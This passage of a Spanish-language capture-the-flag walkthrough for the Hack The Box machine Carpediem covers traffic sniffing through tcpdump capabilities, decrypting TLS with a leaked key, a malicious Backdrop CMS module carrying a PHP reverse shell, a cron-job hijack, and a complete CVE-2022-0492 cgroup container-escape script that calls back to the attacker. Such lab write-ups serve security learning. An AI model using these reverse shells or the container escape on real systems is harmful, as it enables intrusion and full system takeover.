Ahora podemos usar esas credencial para intenrar logearnos por **SSH**, con el usuario `hflaccus` (del nombre Horacio Flaccus que se mencionaba en los mensajes, y la abreviación siguiendo el patrón de los demás usuarios). Una vez dentro logramos conseguir la flag:

```console
❯ sshpass -p 'AuRj4pxq9qPk' ssh hflaccus@10.10.11.167
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 06 Sep 2022 05:01:49 AM UTC

  System load:  0.1               Processes:                256
  Usage of /:   73.3% of 9.46GB   Users logged in:          0
  Memory usage: 29%               IPv4 address for docker0: 172.17.0.1 <--- we confirm docker again!
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.167

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

hflaccus@carpediem:~$ find / -name flag.txt 2>/dev/null | xargs ls -l
total 4
-rw-r----- 1 root hflaccus 33 Sep  6 04:48 user.txt
```

## Privilege Escalation

* * *

Empezamos con un reconocimiento básico del sistema listando el **sistema operativo, la distribución, las interfaces de red, etc**. Como usuario listamos si tenemos **binarios para ejecutar como sudo o binarios SUID del sistema**. No encontramos algo interesante, así que tirando de **Linpeas** (herramienta para enumeración en Linux para escalar privilegios) encontramos cosas interesantes:

```console
hflaccus@carpediem:/tmp$ ./linpeas.sh > linpeas_enumeration
...
══╣ Possible private SSH keys were found!
/etc/ssl/certs/backdrop.carpediem.htb.key
...
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:                                                                                                                                            CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000                                                                                                                                              
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:  
0x0000000000000000=

Files with capabilities (limited to 50):                                              
/usr/bin/ping = cap_net_raw+ep                                                        
/usr/bin/mtr-packet = cap_net_raw+ep                                                  
/usr/bin/traceroute6.iputils = cap_net_raw+ep                                         
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip <---- sniffing
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
...
```

> Puedes encontrar `linpeas` en su repositorio [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
{: .prompt-info}

Encontramos una llave privada del dominio _backdrop.carpediem.htb_ y además las **capabilities** para poder usar el binario `tcpdump`, que en pocas palabras sirve para olfatear/analizar tráfico en una comunicación.

> ¿ Qué son **capabilities** ?
>
> Son atributos especiales en el **Kernel** de Linux que dividen los privilegios disponibles para los procesos que se ejecutan como usuario  **root** en grupos mas pequeños de privilegios

Existe una lista de **capabilities** que podemos asignar a cada usuario

Cada **capability** puede tener 3 valores: 
1. **P(permitted)**: Marca la capability como habilitada. Ahora esta podrá tener el valor de _Effective_ o _Inheritable_
2. **E(Effective)**: Aplica la capability al proceso definido
3. **I(Inheritable)**: La pueden heredar los subprocesos

Entonces ya podemos tener mas claro esto: 

```console
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip <-- e + i + p (habilitada, efectiva y heredable)
                          \             \_________ use RAW and PACKET sockets, etc
                           \______________________ Perform various network-related operations, etc
```

Con respecto al nuevo dominio, lo agregamos nuevamente a nuestro _/etc/hosts_ y nos redirige a la primera página. Sin embargo, si recordamos nuestra **enumeración de hosts**, recordamos que teniamos varias interfaces:

```text
# portDiscovery.sh 

Host discovery:

Host 172.17.0.1: UP.
Host 172.17.0.4: UP.
Host 172.17.0.2: UP.
Host 172.17.0.6: UP.
Host 172.17.0.5: UP.
Host 172.17.0.3: UP.

Port discovery:

Host 172.17.0.1: <--- Host machine (carpediem.htb / 10.10.11.167)
        Port 80: OPEN
        Port 22: OPEN
Host 172.17.0.2: <-- MongoDB
        Port 27017: OPEN
Host 172.17.0.3: <-- MySQL
        Port 3306: OPEN 
        Port 33060: OPEN 
Host 172.17.0.4: <--- ?
        Port 21: OPEN 
        Port 80: OPEN 
        Port 443: OPEN 
Host 172.17.0.5: <--- trudesk.carpediem.htb
        Port 8118: OPEN 
Host 172.17.0.6: <--- porta.carpediem.htb
        Port 80: OPEN
```

Observamos que nos falta saber que servicios corren por la interfaz `172.17.0.4`. Por **FTP(21)** no encontramos información, veamos los de los servicios web:

Ya que tenemos conexión con esa interfaz, usamos `curl` para ver la data por el protocolo **HTTP(80)** y encontramos la página por defecto del servidor web **Apache**. Sin embargo, por el protocolo **HTTPS(443)** encontramos el CMS en php `Backdrop` (Content Management System)

Entonces, para poder visualizar la interfaz tenemos que aplicar un **redireccionamiento de puerto local** para traer ese puerto **443** de la máquina `172.17.0.4` a nuestro puerto **443** local. Podemos usar `chisel`, pero ya que tenemos conexión con la máquina por **SSH(hflaccus)**, creamos un **tunel por SSH** para hacer la conexión de puertos:

```console
❯ ssh -L localhost:443:172.17.0.4:443 hflaccus@10.10.11.167                           
...

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ ss -tulnp | grep 443
tcp   LISTEN 0      128                         127.0.0.1:443        0.0.0.0:*    users:(("ssh",pid=112335,fd=5))         
tcp   LISTEN 0      128                             [::1]:443           [::]:*    users:(("ssh",pid=112335,fd=4))
```

Entrando a la interfaz encontramos un panel de login:

![backdropWeb](backdrop_web.png){: .shadow}

Podemos enumerar usuarios con la lista que teniamos ya que nos muestra un panel de respuesta de la existencia de un usuario. De la base de datos `Mongodb` tenemos algunos nombres de usuarios, y el único válido es `jpardella`

> Ten cuidado al realizar ataques de fuerza bruta, ya que lo intenté y te bloquea la **IP**
{: .prompt-warning}

El siguiente paso es intentar conseguir la contraseña del usuario `jpardella` de esta web. Y ya que podemos hacer **sniffing** gracias a las **capabilities** vistas anteriormente, usamos el binario `tcpdumb` para interceptar el tráfico por cualquier interfaz de red por el puerto **443**, luego de unos minutos guardamos esa captura y lo trasladamos a nuestra máquina para analizarla con `Wireshark`:

```console
hflaccus@carpediem:~$ tcpdump -i any port 443 -w capture.pcap
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes
^C732 packets captured
732 packets received by filter
0 packets dropped by kernel
```

Ya que el tráfico es por el protocolo **TLS(Transport Layer Security)**, veremos que está encriptado y no podemos extraer algún tipo de información por el protocolo **HTTPS**

Por ello, usaremos la llave privada que encontramos para el dominio `backdrop.carpediem.htb` que es justamente el de la web donde queremos extraer credenciales del panel de login. Entonces insertamos la llave en las configuraciones de `Wireshark` (Edit/Preferences/Protocols/TLS), filtramos por el protocolo **HTTP** y encontraremos la data del panel de **Login**:

![sniffingWeb](sniffing_web.png){: .shadow}

Con las credenciales entramos en la web y tenemos la siguiente interfaz:

![backdropWEB](backdrop_http.png){: .shadow}

Despues de revisar la web y no encontrar algo interesante, buscando en internet **vulnerabilidades del CMS Backdrop**, encontramos un **CSRF(Cross-Site Request Forgery)**, el cúal consiste en la explotación de un recurso por parte de un usuario en el cual el **sitio web confía** [CVE-2021-45268](https://nvd.nist.gov/vuln/detail/CVE-2021-45268)

![CVE-2021-45268](CVE-2021-45268_concept.png){: .shadow}

La explotación consiste en subir código malicioso por medio de un plugin. Para ello necesitamos permisos administradores, el cual obviamente tenemos como `jpardella`:

> Primero necesitamos crear un plugin con las características necesarias de **Backdrop**
> 
> Por defecto un plugin/módulo necesita los archivos _.info_ y _.module_

```console
───────┬────────────────────────────────────────
       │ File: rce.info
───────┼────────────────────────────────────────
   1   │ name = shell
   2   │ description = remote code execution
   3   │ backdrop = 1.x
   4   │ type = module
───────┴────────────────────────────────────────
───────┬────────────────────────────────────────
       │ File: rce.module   <EMPTY>
───────┴────────────────────────────────────────
```

> Los campos especificados en cada archivo son obligatorios (menos la descripción) paraque sean recnocidos como un módulo
{: .prompt-tip}

> Con esto listo ahora necesitamos agregar le archivo malicioso, en esta ocasión una **Shell reversa en php**

```php
<?php
  $ip = $_GET['ip'];

  $command = "bash -c 'bash -i >& /dev/tcp/{$ip}/1234 0>&1'";
  exec($command);
?>
```

Por último metemos todos estos archivos en una carpeta de nombre X y lo comprimimos en un archivo formato `.tar`

> Es importante que los archivos X.info, X.module y la carpeta donde las coloques para comprimirlos tengan el mismo nombre (rce en mi caso)
{: .prompt-warning}

> Esta plantilla la puedes encontrar en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Carpediem/module_www-data.2)
{: .prompt-info}

Con esto listo, solo subes el comprimido, lo buscas en la ruta de _/uploads_, lo ejecutas y ya tenemos acceso al aquipo `172.17.0.2 (backdrop.carpediem.htb)`:

```console
❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.167:52002.
bash: cannot set terminal process group (280): Inappropriate ioctl for device
bash: no job control in this shell
www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ whoami
whoami
www-data
www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ hostname
hostname
90c7f522b842
www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ hostname -I
hostname -I
172.17.0.2
```

Seguimos en un contenedor como usuario `www-data`. Haciendo un reconocimiento del sistema listamos procesos que se ejecuten como `root` y encontramos el script `/opt/hearbeat.sh`:

```bash
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
        exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
        #something went wrong.  restoring from backup.
        cp /root/index.php /var/www/html/backdrop/index.php
fi

```

Tenemos una tarea **Cron** que se ejecutara cada 10 segundos donde ejecutará el script `backdrop.sh` del servicio web. Investigando sobre los archivos del CMS **Backdrop** encontramos que sirve **ejecutar scripts del CMS Backdrop** que se encuentren en la ruta raiz de tu web.

Examinando el código en `php` observamos que se incluye el archivo `index.php` como variable por defecto, y si existe, usará el término `include` (que añade archivo php al archivo actual y lo ejecuta) y lo ejecutará. Ya que somo el usuario `www-data` y tenemos permisos para modificar archivos de la web, entonces modificamos ese archivo con código malicioso **(Reverse shell)** y conseguimos ser el usuario `root` del contenedor:

```console
www-data@90c7f522b842:/var/www/html/backdrop$ ls            
LICENSE.txt  README.md  core  files  index.php  layouts  modules  robots.txt  settings.php  sites  themes
www-data@90c7f522b842:/var/www/html/backdrop$ cmd="bash -c 'bash -i >& /dev/tcp/10.10.14.62/5555 0>&1'"
www-data@90c7f522b842:/var/www/html/backdrop$ echo -e "<?php exec(\"$cmd\"); ?>" > index.php
www-data@90c7f522b842:/var/www/html/backdrop$ cat index.php 
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.14.62/5555 0>&1'"); ?>
www-data@90c7f522b842:/var/www/html/backdrop$ 

───────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 5555
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:36566.
bash: cannot set terminal process group (21608): Inappropriate ioctl for device
bash: no job control in this shell
root@90c7f522b842:/var/www/html/backdrop# 
```

Ya como `root` en el contenedor, investigando **como escapar de contenedores** encontramos una vulnerabilidad muy interesante de este año [CVE-2022-0492](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0492)

En mi caso me costó entenderlo a la perfección ya que es la primera vez que toco el tema de **Contenedores y monturas**

En resumen, cuando estamos en un contenedor hacemos uso de **cgroups**, lo cuál es una característica de Linux que usa **Docker** para aislar sus contenedores y los recursos usados por sus respectivos procesos. Los **cgroups** se administran en un sistema de archivos montado. Estos **cgroups** se dividen en _subsistemas_, donde cada uno de estos configura el acceso a un recurso direfente (memory cgroup, device cgroup, etc). A cada **cgroup** creado puedes agregarle procesos, etc.

Lo importante aquí es el archivo _release_agent_ de **cgroups**, el cúal plos administradores pueden configurar un programa para ejecutarse al terminar un proceso en el respectivo **cgroup**. Además, para habilitar esta característica debemos activar el archivo _notify\_on\_release_ 

Para modificar estos archivos necesitamos un **cgroup** com permisos de escritura, como nos encontramos en un contenedor no lo tenemos ya que necesitamos la **capability CAP_SYS_ADMIN**

```console
root@90c7f522b842:/# set `cat /proc/$$/status | grep "CapEff:"`; capsh --decode=$2 | grep sys_admin
root@90c7f522b842:/#
```

Para solucionar esto, como contenedores usamos `unshare` y **creamos un nuevo espacio de nombres de usuario y cgroup** para tener la capability y poder montar un sistema de archivos **cgroup (cgroupfs)**

```console
root@90c7f522b842:/# unshare -UrmC bash
root@90c7f522b842:/# mkdir /tmp/mountest && mount -t cgroup -o rdma cgroup /tmp/mountest && mkdir /tmp/mountest/x
```

> Tengamos en cuenta que al hacer la montura, esta sea montada en el **cgroup root** (cat /proc/self/cgroup), ya que de esa manera podremos visualizar el archivo _release_agent_
{: .prompt-warning}

Ahora tenemos que invocar la característica _notify\_on\_release_

```sh
echo 1 > /tmp/cgrp/x/notify_on_release
```

Luego asignamos el path donde colocaremos el archivo que ejecutaremos _/cmd_

```sh
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Ahora solo escribimos los comando que queremos ejecutar en el archivo

```sh
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
```

Por último solo creamos un proceso que termine al mismo instante para así llamar al archivo _release_agent_ y ejecutar nuestro archivo _/cmd_

```sh
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Podemos juntar todo en un script y ejecutarlo:

```sh
#!/bin/sh

# unshare -UrmC bash
mkdir /tmp/.privesc
mkdir /tmp/.privesc/mountest
mount -t cgroup -o rdma cgroup /tmp/.privesc/mountest
mkdir /tmp/.privesc/mountest/x
echo 1 > /tmp/.privesc/mountest/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/mountest/release_agent
echo '#!/bin/sh' > /cmd
echo "bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/.privesc/mountest/x/cgroup.procs"
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/CVE-2022-0492/cve-2022-0492.sh)
{: .prompt-info}

Finalmente somo usuarios `root` de la máquina `10.10.11.167` y conseguimos la flag:

```console
root@90c7f522b842:/tmp# ./CVE-2022-0492.sh 10.10.14.62 6666
root@90c7f522b842:/tmp# 

───────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 6666
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:40250.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@carpediem:/# whoami
whoami
root
root@carpediem:/# find / -name root.txt | xargs ls -l
find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Sep  6 04:48 /root/root.txt
root@carpediem:/#
```

> Aquí tienes mas información sobre **CVE-2022-0492**:
>
> [https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)
>
> [https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
>
> [https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)
